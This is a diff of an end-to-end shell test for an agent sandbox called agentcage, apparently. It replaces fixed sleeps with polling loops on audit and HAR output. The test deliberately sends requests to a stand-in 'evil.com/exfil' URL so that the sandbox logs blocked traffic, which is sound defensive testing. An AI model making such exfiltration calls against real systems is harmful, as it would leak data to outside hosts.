@@ -18,11 +18,25 @@ if ! curl -sf "$BASE/" >/dev/null 2>&1; then
   # Generate some traffic
   curl -s "$BASE/fetch?url=https://httpbin.org/get" >/dev/null 2>&1 || true
   curl -s "$BASE/fetch?url=https://evil.com/exfil" >/dev/null 2>&1 || true
-  sleep 2
+  # Poll until audit log contains the expected entry (up to 10s)
+  _audit_deadline=$((SECONDS + 10))
+  while [ "$SECONDS" -lt "$_audit_deadline" ]; do
+    if agentcage cage audit "$CAGE" --json-lines -n 10 2>&1 | grep -q '"decision"'; then
+      break
+    fi
+    sleep 1
+  done
 else
   # Ensure we have blocked traffic for audit tests
   curl -s "$BASE/fetch?url=https://evil.com/exfil" >/dev/null 2>&1 || true
-  sleep 1
+  # Poll until audit log contains the blocked entry (up to 10s)
+  _audit_deadline=$((SECONDS + 10))
+  while [ "$SECONDS" -lt "$_audit_deadline" ]; do
+    if agentcage cage audit "$CAGE" --json-lines -n 10 2>&1 | grep -q '"decision"'; then
+      break
+    fi
+    sleep 1
+  done
 fi
 
 # Audit tests
@@ -61,7 +75,16 @@ create_cage "$CONFIGS/har.yaml" >/dev/null
 if wait_ready "$HAR_BASE" 120; then
   # Generate traffic
   curl -s "$HAR_BASE/fetch?url=https://httpbin.org/get" >/dev/null 2>&1 || true
-  sleep 3
+  # Poll until HAR data is available (up to 15s)
+  _har_deadline=$((SECONDS + 15))
+  _har_ready=false
+  while [ "$SECONDS" -lt "$_har_deadline" ]; do
+    if agentcage cage har "$HAR_CAGE" --json-lines -n 1 2>&1 | grep -q '"flow_id"'; then
+      _har_ready=true
+      break
+    fi
+    sleep 1
+  done
 
   HAR_FILE=$(mktemp /tmp/e2e-har-XXXXXX.har)
   if agentcage cage har "$HAR_CAGE" --view inbound -o "$HAR_FILE" >/dev/null 2>&1; then
